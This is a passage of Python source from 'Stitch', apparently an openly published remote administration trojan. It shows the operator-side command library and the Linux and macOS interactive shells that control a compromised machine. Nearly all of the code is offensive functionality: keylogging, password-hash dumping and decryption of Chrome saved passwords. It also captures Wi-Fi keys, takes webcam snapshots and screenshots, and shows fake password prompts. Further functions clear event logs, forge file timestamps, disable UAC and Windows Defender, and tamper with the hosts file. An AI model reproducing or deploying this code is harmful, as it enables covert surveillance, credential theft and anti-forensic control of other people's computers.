                    port = raw_input("\nEnter the desired port: ",)
                    proto = raw_input("Enter desired type [TCP/UDP]: ",)
                    if windows_client(self.cli_os):
                        direction = raw_input("Enter desired direction [in/out]: ",)
                    correct = raw_input("\nClose {} Port {} going {}? [y/n]: ".format(proto,port,direction),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            if windows_client(self.cli_os):
                cmd = 'netsh advfirewall firewall delete rule name="NetBios Port {} {}" protocol={} localport={}'.format(port, direction,proto,port)
            if osx_client(self.cli_os):
                cmd = 'pfctl -sr 2>/dev/null | fgrep -v "block drop quick proto {} from any to any port = {}") | pfctl -f - '.format(proto,port)
            self.send(cmd)
            st_print(self.receive())
        elif option == "allow" and windows_client(self.cli_os):
            try:
                while True:
                    prog = raw_input("\nEnter the desired program to allow: ",)
                    rulename = raw_input("Enter the name of the firewall rule: ",)
                    correct = raw_input('\nLet the rule "{}" allow {} through the firewall? [y/n]: '.format(rulename,prog),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('fwallow.py',pylib=True)
            self.send(prog)
            self.send(rulename)
            st_print(self.receive())
        else:
            usage_firewall()

    def hashdump(self):
        if windows_client(system=self.cli_os):
            self.pyexec('hashdump.py',pylib=True)
            resp = self.receive()
            if no_error(resp):
                st_print(resp)
                st_print(self.receive())
                st_print(self.receive())
            else:
                st_print(resp)
        if osx_client(system=self.cli_os):
            self.pyexec('hashdump.py',pylib=True)
            resp = self.receive()
            st_print(resp)
        if linux_client(system=self.cli_os):
            self.pyexec('hashdump.py',pylib=True)
            resp = self.receive()
            st_print(resp)
            if no_error(resp):
                resp = self.receive()
                st_print(resp)
        if no_error(resp):
            st_logger(resp,self.cli_dwld,'hashdump')

    def hide(self,line):
        if line:
            self.pyexec('hide.py',pylib=True)
            self.send(line)
            st_print(self.receive())
        else:
            usage_hide()

    def hostsfile(self,option):
        if option == 'update':
            try:
                while True:
                    hostname = raw_input("\nEnter desired hostname to add to the hosts file: ")
                    ipaddress = raw_input('\nEnter the IP address of "{}": '.format(hostname))
                    correct = raw_input('\nAdd "{}" with IP: {} to the hosts file? [Y/N]: '.format(hostname,ipaddress))
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('hostsupdate.py',pylib=True)
            self.send(hostname)
            self.send(ipaddress)
            st_print(self.receive())
        elif option == 'remove':
            try:
                while True:
                    hostname = raw_input("\nEnter desired hostname to remove from the hosts file: ")
                    correct = raw_input('\nRemove "{}" from the hosts file? [Y/N]: '.format(hostname))
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('hostsremove.py',pylib=True)
            self.send(hostname)
            st_print(self.receive())
        elif option == 'show':
            self.cat(self.cli_hosts_file)
        else:
            usage_hostsfile()

    def ifconfig(self, args):
        if windows_client(system=self.cli_os):
            cmd = 'ipconfig {}'.format(args)
        else:
            cmd = 'ifconfig {}'.format(args)
        self.send(cmd)
        st_print(self.receive())

    def ipconfig(self, args):
        self.ifconfig(args)

    def keylogger(self, option):
        if option == 'start':
            self.pyexec('kl_start.py',pylib=True)
            st_print(self.receive())
        elif option == 'stop':
            self.pyexec('kl_stop.py',pylib=True)
            st_print(self.receive())
        elif option == 'dump':
            self.pyexec('kl_dump.py',pylib=True)
            resp = self.receive()
            st_print(resp)
            if not resp.startswith('[*]'):
                st_logger(resp,self.cli_dwld,'keylogger')
        elif option == 'status':
            self.pyexec('kl_status.py',pylib=True)
            st_print(self.receive())
        else:
            usage_keylogger()

    def location(self):
        self.pyexec('location.py',pylib=True)
        st_print('=== Location ===')
        st_print(self.receive())

    def lockscreen(self):
        self.pyexec('lockscreen.py',pylib=True)
        st_print(self.receive())

    def ls(self, args):
        if windows_client(system=self.cli_os):
            cmd = 'dir /a {}'.format(args)
        else:
            cmd = 'ls -alh {}'.format(args)
        self.send(cmd)
        st_print(self.receive())

    def lsmod(self, args):
        if windows_client(system=self.cli_os):
            cmd = 'driverquery {}'.format(args)
        elif linux_client(system=self.cli_os):
            cmd = 'lsmod {}'.format(args)
        elif osx_client(system=self.cli_os):
            cmd = 'kextstat {}'.format(args)
        self.send(cmd)
        st_print(self.receive())

    def more(self, args):
        if args:
            self.cat(args)
        else:
            usage_more()

    def popup(self):
        try:
            while True:
                message = raw_input("\nMessage to be displayed in popup: ")
                correct = raw_input('\nDisplay a popup saying "{}" ? [Y/N]: '.format(message))
                if correct.lower().startswith('y'):
                    break
        except KeyboardInterrupt:
            print '\n'
            return
        self.pyexec('popup.py',pylib=True)
        self.send(message)
        st_print(self.receive())

    def pwd(self):
        if windows_client(system=self.cli_os):
            self.send('cd')
        else:
            self.send('pwd')
        st_print(self.receive())

    def ps(self,args):
        if windows_client(system=self.cli_os):
            cmd = 'tasklist {}'.format(args)
        else:
            cmd = 'ps {}'.format(args)
        self.send(cmd)
        st_print(self.receive())

    def pyexec(self, f_name, pylib=False):
        code = ''
        cur_dir = os.getcwd()
        py_file = f_name.strip()
        if py_file != '':
            if pylib:
                dir_path = pylib_path
                py_file_path = os.path.join(pylib_path,py_file)
            else:
                dir_path = uploads_path
                py_file_path = os.path.join(uploads_path,py_file)
            if os.path.exists(py_file_path):
                if not py_file.endswith('.py') or os.path.isdir(py_file_path):
                    st_print("[!] Only Python scripts located in %s can use pyexec.\n" %(dir_path))
                    return
                with open(py_file_path,'rb') as c:
                    for line in c.readlines():
                        code += line
                if pylib:
                    if not f_name == 'get_path.py':
                        st_log.info('Sending {} code from {}'.format(self.cli_target, f_name))
                    self.send('pylib'+ code)
                else:
                    self.send('pyexec'+ code)
                    st_print(self.receive())
            else:
                st_print('[!] %s is not located in %s.\n' % (py_file,dir_path))
        else:
            st_print('[!] File name is required.\n')

    def screenshot(self):
        self.pyexec('screenshot.py',pylib=True)
        st_print(self.receive())
        sc = os.path.join(self.cli_temp,'fs.jpg')
        self.download(sc)
        if windows_client(system=self.cli_os):
            cmd = 'del {}'.format(sc)
        else:
            cmd = 'rm -f {}'.format(sc)
        self.send(cmd)
        self.receive()

    def sysinfo(self):
        self.pyexec('sysinfo.py',pylib=True)
        st_print('=== System info ===')
        st_print(self.receive())

    def touch(self, f_name):
        if windows_client(system=self.cli_os):
            cmd = 'if not exist {} type NUL > {}'.format(f_name,f_name)
        else:
            cmd = 'touch {}'.format(f_name)
        self.send(cmd)
        st_print(self.receive())

    def unhide(self,line):
        if line:
            self.pyexec('unhide.py',pylib=True)
            self.send(line)
            st_print(self.receive())
        else:
            usage_unhide()

    def upload(self, f_name, to_cwd=True):
        if to_cwd:
            self.pyexec('upload.py',pylib=True)
        u_file = f_name.strip('\\/')
        if '.' in u_file and not u_file.startswith('.'):
            extension = u_file.index('.')
            u_base = u_file[:extension]
            u_zip = "{}.zip".format(u_base)
        else:
            u_zip = "{}.zip".format(u_file)
        self.send(u_zip)
        content = ''
        cur_dir = os.getcwd()
        if u_file != '':
            u_file_path = os.path.join(uploads_path,u_file)
            if os.path.exists(u_file_path):
                os.chdir(uploads_path)
                u_zip_path = os.path.join(stitch_temp_path, u_zip)
                if os.path.isdir(u_file):
                    zipf = zipfile.ZipFile(u_zip_path, 'w', zipfile.ZIP_DEFLATED)
                    zipdir(u_file,zipf)
                    zipf.close()
                else:
                    zipf = zipfile.ZipFile(u_zip_path, 'w', zipfile.ZIP_DEFLATED)
                    zipf.write(u_file)
                    zipf.close()
                st_print("[*] Beginning upload of {}...".format(u_file))
                size =os.stat(u_zip_path)
                size = size.st_size
                upload_bar = progress_bar(size)
                upload_bar.file_info()
                with open (u_zip_path, 'rb') as upload:
                    line = upload.read(1024)
                    while line:
                        self.send(line)
                        upload_bar.increment()
                        line = upload.read(1024)
                upload_bar.complete()
                self.send('upload complete')
                os.remove(u_zip_path)
                st_print(self.receive())
            else:
                st_print('[!] {} is not located in {}.\n'.format(u_file,uploads_path))
                self.send("ERROR")

    def vmscan(self):
        self.pyexec('vmscan.py',pylib=True)
        st_print(self.receive())

    def webcamsnap(self, cam_dev):
        self.pyexec('webcamSnap.py',pylib=True)
        if cam_dev:
            self.send(cam_dev)
        else:
            if windows_client(system=self.cli_os):
                self.send("0")
            else:
                self.send('st_continue')
        if not windows_client(system=self.cli_os):
            upload_imgsnap = self.receive()
            if upload_imgsnap == 'upload_imgsnap':
                shutil.copy(imagesnap,os.path.join(uploads_path,'.st_imsnp'))
                self.upload('.st_imsnp', to_cwd=False)
                os.remove(os.path.join(uploads_path,'.st_imsnp'))
        resp = self.receive()
        if no_error(resp):
            st_print(resp)
            sc = os.path.join(self.cli_temp,'wb.jpg')
            self.download(sc)
            if windows_client(system=self.cli_os):
                cmd = 'del {}'.format(sc)
            else:
                cmd = 'rm -f {}'.format(sc)
            self.send(cmd)
            self.receive()
        else:
            st_print(resp)

    def webcamlist(self):
        self.pyexec('webcamList.py',pylib=True)
        resp = self.receive()
        if windows_client(system=self.cli_os):
            st_print(resp)
            if no_error(resp):
                st_print(self.receive())
        else:
            if resp == 'upload_imgsnap':
                shutil.copy(imagesnap,os.path.join(uploads_path,'.st_imsnp'))
                self.upload('.st_imsnp', to_cwd=False)
                os.remove(os.path.join(uploads_path,'.st_imsnp'))
            resp = self.receive()
            st_print(resp)
            if no_error(resp):
                st_print(self.receive())

################################################################################
#                        Start of DISCONNECT Section                           #
################################################################################

    def exit(self, alive=True):
        if alive: self.send("end_connection")
        st_print("[-] Disconnected from {}\n".format(self.cli_target))
        self.client.close()
        return True

    def EOF(self):
        return self.exit()

################################################################################
#                      Start of WINDOWS SPECIFIC Section                       #
################################################################################

    def clearev(self):
        resp = raw_input("\nAre you sure you want to clear the System, Security, and Application event logs? [Y/N]: ")
        if resp.lower().startswith('y'):
            self.pyexec('clearev.py',pylib=True)
            st_print(self.receive())
        else:
            print

    def chromedump(self):
        if windows_client():
            self.pyexec('chromedump.py',pylib=True)
            resp = self.receive()
            if no_error(resp):
                if windows_client(self.cli_os):
                    self.download('C:\\Windows\\Temp\\c_log_626')
                    self.send('del C:\\Windows\\Temp\\c_log_626')
                else:
                    self.download('/tmp/c_log_626')
                    self.send('rm -f /tmp/c_log_626')
                self.receive()
                zip_name = "{}-c_log_626.zip".format(self.cli_user)
                zip_loc = os.path.join(self.cli_dwld, zip_name)
                chrome_path = os.path.join(self.cli_dwld,'c_log_626')
                if os.path.exists(zip_loc):
                    with zipfile.ZipFile(zip_loc, "r") as z:
                        z.extractall(self.cli_dwld)
                    info_list = ''
                    try:
                        connection = sqlite3.connect(chrome_path)
                        with connection:
                            cursor = connection.cursor()
                            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                            value = v.fetchall()
                        for information in value:
                            password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                            if password:
                                info_list += 'origin_url: {}\nusername: {}\npassword: {}\n\n'.format(information[0],information[1],str(password))
                    except sqlite3.OperationalError, e:
                            e = str(e)
                            connection.close()
                            os.remove(zip_loc)
                            os.remove(chrome_path)
                            if (e == 'database is locked'):
                                st_print('[!] Make sure Google Chrome is not running in the background')
                            elif (e == 'no such table: logins'):
                                st_print('[!] Something is wrong with the database name')
                            elif (e == 'unable to open database file'):
                                st_print('[!] Something is wrong with the database path')
                            else:
                                st_print(e)
                    connection.close()
                    os.remove(zip_loc)
                    os.remove(chrome_path)
                    st_print('=== Chrome Password Dump ===')
                    st_print(info_list)
                    st_logger(info_list,self.cli_dwld,'chromedump')
            else:
                st_print(resp)
        else:
            st_print('[*] Must be running Stitch on a windows machine to use this function.\n')

    def drives(self):
        self.pyexec('drive_finder.py',pylib=True)
        st_print(self.receive())

    def editaccessed(self, f_name):
        if f_name:
            try:
                while True:
                    editfile = f_name
                    edittime = raw_input("Enter desired last accessed time ['MM/DD/YYYY HH:mm:ss']: ",)
                    correct = raw_input("\nChange last accessed time of {} to {}? [Y/N]: ".format(editfile,edittime),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('editAccessed.py',pylib=True)
            self.send(editfile)
            self.send(edittime)
            st_print(self.receive())
        else:
            usage_editaccessed()

    def editcreated(self, f_name):
        if f_name:
            try:
                while True:
                    editfile = f_name
                    edittime = raw_input("Enter desired creation time ['MM/DD/YYYY HH:mm:ss']: ",)
                    correct = raw_input("\nChange creation time of {} to {}? [Y/N]: ".format(editfile,edittime),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('editCreation.py',pylib=True)
            self.send(editfile)
            self.send(edittime)
            st_print(self.receive())
        else:
            usage_editcreated()

    def editmodified(self, f_name):
        if f_name:
            try:
                while True:
                    editfile = f_name
                    edittime = raw_input("Enter desired last modified time ['MM/DD/YYYY HH:mm:ss']: ",)
                    correct = raw_input("\nChange last modified time of {} to {}? [Y/N]: ".format(editfile,edittime),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('editModified.py',pylib=True)
            self.send(editfile)
            self.send(edittime)
            st_print(self.receive())
        else:
            usage_editmodified()

    def enableRDP(self):
        self.pyexec('enableRDP.py',pylib=True)
        st_print(self.receive())

    def enableUAC(self):
        self.pyexec('enableUAC.py',pylib=True)
        st_print(self.receive())

    def enableWindef(self):
        self.pyexec('enableWinDef.py',pylib=True)
        st_print(self.receive())

    def freeze(self, option):
        if option == 'start':
            self.pyexec('freeze_start.py',pylib=True)
            st_print(self.receive())
        elif option == 'stop':
            self.pyexec('freeze_stop.py',pylib=True)
            st_print(self.receive())
        elif option == 'status':
            self.pyexec('freeze_status.py',pylib=True)
            st_print(self.receive())
        else:
            usage_freeze()

    def disableRDP(self):
        self.pyexec('disableRDP.py',pylib=True)
        st_print(self.receive())

    def disableUAC(self):
        self.pyexec('disableUAC.py',pylib=True)
        st_print(self.receive())

    def disableWindef(self):
        self.pyexec('disableWinDef.py',pylib=True)
        st_print(self.receive())

    def scanreg(self):
        self.pyexec('scanReg.py',pylib=True)
        st_print('=== Registry Scan ===')
        st_print(self.receive())

    def wifikeys(self):
        self.pyexec('wifikeys.py',pylib=True)
        st_print('=== System Wifi Keys ===')
        keys = self.receive()
        st_print(keys)
        st_logger(keys,self.cli_dwld,'wifikeys')

################################################################################
#               Start of MAC OS X / LINUX SPECIFIC Section                     #
################################################################################

    def askpassword(self):
        self.pyexec('askpass.py',pylib=True)
        st_print("[*] Waiting for the user's response...")
        resp = self.receive()
        st_print(resp)
        st_logger(resp,self.cli_dwld,'askpassword')

    def logintext(self):
        text = raw_input("Enter text to be displayed on login window: ")
        cmd = "defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText \"{}\"".format(text)
        self.send(cmd)
        st_print(self.receive())

    def ssh(self):
        try:
            ssh_host = raw_input("\nPlease enter ssh hostname: ")
            if 'exit' in ssh_host:
                print '\n'
                return
            ssh_user = raw_input("\nPlease enter ssh user: ")
            if 'exit' in ssh_user:
                print '\n'
                return
            ssh_pass = getpass("\nPlease enter password for {}: ".format(ssh_user))
        except KeyboardInterrupt:
            print '\n'
            return

        self.pyexec('ssh.py',pylib=True)
        self.send(ssh_user)
        self.send(ssh_host)
        self.send(ssh_pass)

        prompt = self.receive()
        if no_error(prompt):
            while True:
                ssh_cmd=raw_input(prompt)
                if ssh_cmd == 'cls' or ssh_cmd == 'clear':
                    self.clear()
                else:
                    self.send(ssh_cmd)
                    if ssh_cmd == 'exit': break
                    st_print(self.receive())
        else:
            st_print('{}\n'.format(prompt))

    def sudo(self, line):
        self.pyexec('sudo_cmd.py',pylib=True)
        self.send(line)
        resp= self.receive()
        while resp != 'sudo_success':
            if resp == 'Please enter sudo password:':
                su_pass = getpass("\nPlease enter sudo password:")
                self.send(su_pass)
            if resp == 'Sorry incorrect\nPlease enter sudo password:':
                su_pass = getpass("\nSorry incorrect\nPlease enter sudo password:")
                self.send(su_pass)
            if resp == 'sudo: 3 incorrect password attempts':
                st_print('sudo: 3 incorrect password attempts\n')
                return
            resp = self.receive()
        st_print(self.receive())

```

`Application/stitch_lnxshell.py`:

```py
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import stitch_lib
from stitch_help import *
from stitch_utils import *

class st_lnxshell(cmd.Cmd):

    def begin_session(self,target=None,port=80,socket=None,aes_key=None):
        cmd.Cmd.__init__(self)
        self.alive = True
        self.file_comp = []
        self.dir_comp = []
        self.all_comp = []
        socket.settimeout(30)
        self.cli_temp = '/tmp/'
        self.ignore = ['cls','clear','EOF','exit']
        self.cli_dwld= os.path.join(downloads_path,target)
        self.cli_os = stitch_lib.st_receive(socket, aes_key)
        self.cli_user = stitch_lib.st_receive(socket, aes_key)
        self.cli_hostname = stitch_lib.st_receive(socket, aes_key)
        self.cli_platform = stitch_lib.st_receive(socket, aes_key)
        self.stlib = stitch_lib.stitch_commands_library(socket, target, port, aes_key,
                                        self.cli_os,
                                        self.cli_platform,
                                        self.cli_hostname,
                                        self.cli_user,
                                        self.cli_dwld,
                                        self.cli_temp)
        self.stlib.history_check()
        self.get_path()

    def get_path(self,line='.'):
        self.do_pyexec('get_path.py',pylib=True)
        paths = self.stlib.receive()
        if no_error(paths):
            self.dir_comp = []
            self.all_comp = []
            self.file_comp = []
            total = paths.split('\n')
            for n in total:
                if n.endswith('\\') or n.endswith('/'):
                    self.dir_comp.append(n)
                else:
                    self.file_comp.append(n)
                self.all_comp.append(n)
        self.prompt = self.stlib.receive()

    def default(self, line):
        self.stlib.send(line)
        st_log.info('Sending command: "{}"'.format(line))
        st_print(self.stlib.receive())

    def precmd(self, line):
        if self.stlib.is_alive(line):
            return cmd.Cmd.precmd(self, line)
        else:
            self.alive = False
            return cmd.Cmd.precmd(self, 'exit')

    def postcmd(self, stop, line):
        if not line.startswith(tuple(self.ignore)): self.get_path()
        return cmd.Cmd.postcmd(self, stop, line)

################################################################################
#                           Start of DO Section                                #
################################################################################

    def do_avscan(self,line): self.stlib.avscan()

    def do_cat(self,line): self.stlib.cat(line)

    def do_cd(self,line): self.stlib.cd(line)

    def do_chromedump(self,line): self.stlib.chromedump()

    def do_cls(self, line): self.stlib.clear()

    def do_clear(self, line): self.stlib.clear()

    def do_crackpassword(self,line): self.stlib.crackpassword()

    def do_dir(self,line): self.stlib.ls(line)

    def do_displayoff(self,line): self.stlib.displayoff()

    def do_displayon(self,line): self.stlib.displayon()

    def do_download(self,line): self.stlib.download(line)

    def do_environment(self,line): self.stlib.environment()

    def do_fileinfo(self,line): self.stlib.fileinfo(line)

    def do_hide(self,line): self.stlib.hide(line)

    def do_hostsfile(self,line): self.stlib.hostsfile(line)

    def do_ipconfig(self,line): self.stlib.ifconfig(line)

    def do_keylogger(self,line): self.stlib.keylogger(line)

    def do_location(self,line): self.stlib.location()

    def do_lockscreen(self,line): self.stlib.lockscreen()

    def do_ls(self,line): self.stlib.ls(line)

    def do_lsmod(self,line): self.stlib.lsmod(line)

    def do_more(self,line): self.stlib.more(line)

    def do_pwd(self,line): self.stlib.pwd()

    def do_ps(self,line): self.stlib.ps(line)

    def do_pyexec(self,line,pylib=False): self.stlib.pyexec(line,pylib)

    def do_screenshot(self,line): self.stlib.screenshot()

    def do_ssh(self,line): self.stlib.ssh()

    def do_sudo(self,line): self.stlib.sudo(line)

    def do_sysinfo(self,line): self.stlib.sysinfo()

    def do_touch(self,line): self.stlib.touch(line)

    def do_unhide(self,line): self.stlib.unhide(line)

    def do_upload(self,line): self.stlib.upload(line)

    def do_vmscan(self,line): self.stlib.vmscan()

    def do_webcamsnap(self,line): self.stlib.webcamsnap(line)

    def do_webcamlist(self,line): self.stlib.webcamlist()

    def emptyline(self): pass

    def do_exit(self, line): return self.stlib.exit(alive=self.alive)

    def do_EOF(self, line): return self.stlib.EOF()

################################################################################
#                        Start of COMPLETE Section                             #
################################################################################

    def completedefault(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_cat(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.file_comp)

    def complete_hostsfile(self, text, line, begidx, endidx):
        return find_completion(text,options_hostsfile)

    def complete_keylogger(self, text, line, begidx, endidx):
        return find_completion(text,options_keylogger)

    def complete_more(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.file_comp)

    def complete_cd(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.dir_comp)

    def complete_dir(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_download(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_ls(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_pyexec(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, uploads=True,py_only=True)

    def complete_upload(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, uploads=True,all_dir=True)

################################################################################
#                        Start of HELP Section                                 #
################################################################################

    def help_avscan(self): st_help_avscan()

    def help_cat(self): st_help_cat()

    def help_cd(self): st_help_cd()

    def help_chromedump(self): st_help_chromedump()

    def help_cls(self): st_help_cls()

    def help_clear(self): st_help_clear()

    def help_crackpassword(self): st_help_crackpassword()

    def help_dir(self): st_help_dir()

    def help_displayoff(self): st_help_displayoff()

    def help_displayon(self): st_help_displayon()

    def help_download(self): st_help_download()

    def help_environment(self): st_help_environment()

    def help_fileinfo(self): st_help_fileinfo()

    def help_hide(self): st_help_hide()

    def help_hostsfile(self): st_help_hostsfile()

    def help_ipconfig(self): st_help_ipconfig()

    def help_keylogger(self): st_help_keylogger()

    def help_ls(self): st_help_ls()

    def help_lsmod(self): st_help_lsmod()

    def help_location(self): st_help_location()

    def help_lockscreen(self): st_help_lockscreen()

    def help_more(self): st_help_more()

    def help_pwd(self): st_help_pwd()

    def help_ps(self): st_help_ps()

    def help_pyexec(self): st_help_pyexec()

    def help_screenshot(self): st_help_screenshot()

    def help_ssh(self): st_help_ssh()

    def help_sudo(self): st_help_sudo()

    def help_sysinfo(self): st_help_sysinfo()

    def help_touch(self): st_help_touch()

    def help_unhide(self): st_help_unhide()

    def help_upload(self): st_help_upload()

    def help_vmscan(self): st_help_vmscan()

    def help_webcamsnap(self): st_help_webcamsnap()

    def help_webcamlist(self): st_help_webcamlist()

    def help_exit(self): st_help_exit()

    def help_EOF(self): st_help_EOF()


def start_shell(t,p,c,a):
    shell = st_lnxshell()
    shell.begin_session(target=t, port=p, socket=c, aes_key=a)
    shell.cmdloop()

```

`Application/stitch_osxshell.py`:

```py
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import stitch_lib
from stitch_help import *
from stitch_utils import *

class st_osxshell(cmd.Cmd):

    def begin_session(self,target=None,port=80,socket=None,aes_key=None):
        cmd.Cmd.__init__(self)
        self.alive = True
        self.file_comp = []
        self.dir_comp = []
        self.all_comp = []
        socket.settimeout(30)
        self.cli_temp = '/tmp/'
        self.ignore = ['cls','clear','EOF','exit']
        self.cli_dwld= os.path.join(downloads_path,target)
        self.cli_os = stitch_lib.st_receive(socket, aes_key)
        self.cli_user = stitch_lib.st_receive(socket, aes_key)
        self.cli_hostname = stitch_lib.st_receive(socket, aes_key)
        self.cli_platform = stitch_lib.st_receive(socket, aes_key)
        self.stlib = stitch_lib.stitch_commands_library(socket, target, port, aes_key,
                                        self.cli_os,
                                        self.cli_platform,
                                        self.cli_hostname,
                                        self.cli_user,
                                        self.cli_dwld,
                                        self.cli_temp)
        self.stlib.history_check()
        self.get_path()

    def get_path(self,line='.'):
        self.do_pyexec('get_path.py',pylib=True)
        paths = self.stlib.receive()
        if no_error(paths):
            self.dir_comp = []
            self.all_comp = []
            self.file_comp = []
            total = paths.split('\n')
            for n in total:
                if n.endswith('\\') or n.endswith('/'):
                    self.dir_comp.append(n)
                else:
                    self.file_comp.append(n)
                self.all_comp.append(n)
        self.prompt = self.stlib.receive()

    def default(self, line):
        self.stlib.send(line)
        st_log.info('Sending command: "{}"'.format(line))
        st_print(self.stlib.receive())

    def precmd(self, line):
        if self.stlib.is_alive(line):
            return cmd.Cmd.precmd(self, line)
        else:
            self.alive = False
            return cmd.Cmd.precmd(self, 'exit')

    def postcmd(self, stop, line):
        if not line.startswith(tuple(self.ignore)): self.get_path()
        return cmd.Cmd.postcmd(self, stop, line)

################################################################################
#                           Start of DO Section                                #
################################################################################

    def do_askpassword(self,line): self.stlib.askpassword()

    def do_avscan(self,line): self.stlib.avscan()

    def do_cat(self,line): self.stlib.cat(line)

    def do_cd(self,line): self.stlib.cd(line)

    def do_chromedump(self,line): self.stlib.chromedump()

    def do_cls(self, line): self.stlib.clear()

    def do_clear(self, line): self.stlib.clear()

    def do_dir(self,line): self.stlib.ls(line)

    def do_displayoff(self,line): self.stlib.displayoff()

    def do_displayon(self,line): self.stlib.displayon()

    def do_download(self,line): self.stlib.download(line)

    def do_environment(self,line): self.stlib.environment()

    def do_fileinfo(self,line): self.stlib.fileinfo(line)

    def do_firewall(self,line): self.stlib.firewall(line)

    def do_hashdump(self,line): self.stlib.hashdump()

    def do_hide(self,line): self.stlib.hide(line)

    def do_hostsfile(self,line): self.stlib.hostsfile(line)

    def do_ipconfig(self,line): self.stlib.ifconfig(line)

    def do_keylogger(self,line): self.stlib.keylogger(line)

    def do_location(self,line): self.stlib.location()

    def do_lockscreen(self,line): self.stlib.lockscreen()

    def do_ls(self,line): self.stlib.ls(line)

    def do_lsmod(self,line): self.stlib.lsmod(line)

    def do_more(self,line): self.stlib.more(line)

    def do_popup(self,line): self.stlib.popup()

    def do_pwd(self,line): self.stlib.pwd()

    def do_ps(self,line): self.stlib.ps(line)

    def do_pyexec(self,line,pylib=False): self.stlib.pyexec(line,pylib)

    def do_screenshot(self,line): self.stlib.screenshot()

    def do_sysinfo(self,line): self.stlib.sysinfo()

    def do_touch(self,line): self.stlib.touch(line)

    def do_unhide(self,line): self.stlib.unhide(line)

    def do_upload(self,line): self.stlib.upload(line)

    def do_vmscan(self,line): self.stlib.vmscan()

    def do_webcamsnap(self,line): self.stlib.webcamsnap(line)

    def do_webcamlist(self,line): self.stlib.webcamlist()

    def emptyline(self): pass

    def do_exit(self, line): return self.stlib.exit(alive=self.alive)

    def do_EOF(self, line): return self.stlib.EOF()

################################################################################
#                        Start of MAC OS X SPECIFIC Section                    #
################################################################################

    def do_crackpassword(self,line): self.stlib.crackpassword()

    def do_logintext(self,line): self.stlib.logintext()

    def do_ssh(self,line): self.stlib.ssh()

    def do_sudo(self,line): self.stlib.sudo(line)

################################################################################
#                        Start of COMPLETE Section                             #
################################################################################

    def completedefault(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_cat(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.file_comp)

    def complete_hostsfile(self, text, line, begidx, endidx):
        return find_completion(text,options_hostsfile)

    def complete_keylogger(self, text, line, begidx, endidx):
        return find_completion(text,options_keylogger)

    def complete_more(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.file_comp)

    def complete_cd(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.dir_comp)

    def complete_dir(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_download(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_firewall(self, text, line, begidx, endidx):
        return find_completion(text,options_fw_osx)

    def complete_ls(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_pyexec(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, uploads=True,py_only=True)

    def complete_upload(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, uploads=True,all_dir=True)

################################################################################
#                        Start of HELP Section                                 #
################################################################################

    def help_askpassword(self): st_help_askpassword()

    def help_avscan(self): st_help_avscan()

    def help_cat(self): st_help_cat()

    def help_cd(self): st_help_cd()

    def help_chromedump(self): st_help_chromedump()

    def help_cls(self): st_help_cls()

    def help_clear(self): st_help_clear()

    def help_crackpassword(self): st_help_crackpassword()

    def help_dir(self): st_help_dir()

    def help_displayoff(self): st_help_displayoff()

    def help_displayon(self): st_help_displayon()

    def help_download(self): st_help_download()

    def help_environment(self): st_help_environment()

    def help_fileinfo(self): st_help_fileinfo()

    def help_firewall(self): st_help_firewall()

    def help_hashdump(self): st_help_hashdump()

    def help_hide(self): st_help_hide()

    def help_hostsfile(self): st_help_hostsfile()

    def help_ipconfig(self): st_help_ipconfig()

    def help_keylogger(self): st_help_keylogger()

    def help_ls(self): st_help_ls()

    def help_lsmod(self): st_help_lsmod()

    def help_location(self): st_help_location()

    def help_lockscreen(self): st_help_lockscreen()

    def help_logintext(self): st_help_logintext()

    def help_more(self): st_help_more()

    def help_popup(self): st_help_popup()

    def help_pwd(self): st_help_pwd()

    def help_ps(self): st_help_ps()

    def help_pyexec(self): st_help_pyexec()

    def help_screenshot(self): st_help_screenshot()

    def help_ssh(self): st_help_ssh()

    def help_sudo(self): st_help_sudo()

    def help_sysinfo(self): st_help_sysinfo()

    def help_touch(self): st_help_touch()

    def help_unhide(self): st_help_unhide()

    def help_upload(self): st_help_upload()

    def help_vmscan(self): st_help_vmscan()

    def help_webcamsnap(self): st_help_webcamsnap()

    def help_webcamlist(self): st_help_webcamlist()

    def help_exit(self): st_help_exit()

    def help_EOF(self): st_help_EOF()


def start_shell(t,p,c,a):
    shell = st_osxshell()
    shell.begin_session(target=t, port=p, socket=c, aes_key=a)
